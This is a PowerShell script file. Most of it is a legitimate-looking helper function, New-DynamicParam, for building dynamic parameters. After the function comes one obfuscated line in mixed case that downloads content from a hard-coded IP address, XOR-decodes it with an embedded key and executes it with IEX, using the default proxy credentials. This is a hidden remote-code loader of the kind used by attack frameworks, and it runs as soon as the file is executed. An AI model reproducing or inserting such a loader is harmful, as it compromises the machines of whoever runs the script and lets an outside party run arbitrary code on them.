Function New-DynamicParam {

param(
    
    [string]
    $Name,
    
    [System.Type]
    $Type = [string],

    [string[]]
    $Alias = @(),

    [string[]]
    $ValidateSet,
    
    [switch]
    $Mandatory,
    
    [string]
    $ParameterSetName="__AllParameterSets",
    
    [int]
    $Position,
    
    [switch]
    $ValueFromPipelineByPropertyName,
    
    [string]
    $HelpMessage,

    [validatescript({
        if(-not ( $_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary] -or -not $_) )
        {
            Throw "DPDictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object, or not exist"
        }
        $True
    })]
    $DPDictionary = $false
 
)
    
        $ParamAttr = New-Object System.Management.Automation.ParameterAttribute
        $ParamAttr.ParameterSetName = $ParameterSetName
        if($mandatory)
        {
            $ParamAttr.Mandatory = $True
        }
        if($Position -ne $null)
        {
            $ParamAttr.Position=$Position
        }
        if($ValueFromPipelineByPropertyName)
        {
            $ParamAttr.ValueFromPipelineByPropertyName = $True
        }
        if($HelpMessage)
        {
            $ParamAttr.HelpMessage = $HelpMessage
        }
 
        $AttributeCollection = New-Object 'Collections.ObjectModel.Collection[System.Attribute]'
        $AttributeCollection.Add($ParamAttr)
    
    
        if($ValidateSet)
        {
            $ParamOptions = New-Object System.Management.Automation.ValidateSetAttribute -ArgumentList $ValidateSet
            $AttributeCollection.Add($ParamOptions)
        }

    
        if($Alias.count -gt 0) {
            $ParamAlias = New-Object System.Management.Automation.AliasAttribute -ArgumentList $Alias
            $AttributeCollection.Add($ParamAlias)
        }

 
    
        $Parameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $AttributeCollection)
    
    
        if($DPDictionary)
        {
            $DPDictionary.Add($Name, $Parameter)
        }
        else
        {
            $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
            $Dictionary.Add($Name, $Parameter)
            $Dictionary
        }
}
[SyStem.NeT.SeRViCEPOINtMaNAgER]::ExpeCt100ContinUE = 0;$Wc=NEW-ObJEcT SYStEM.NeT.WEbCliEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEADErs.AdD('User-Agent',$u);$wc.PrOXy = [SYSTEM.NeT.WebREqUest]::DeFaultWEbProxy;$WC.PRoxy.CreDenTIAls = [SySTEm.NEt.CReDEnTialCaCHe]::DEfAULtNETwoRKCREdEnTiaLS;$K='63a9f0ea7bb98050796b649e85481845';$I=0;[cHAr[]]$B=([chAr[]]($Wc.DoWNloaDStRiNg("http://138.121.170.12:3138/index.asp")))|%{$_-BXOr$k[$i++%$K.LENGth]};IEX ($b-JoIn'')

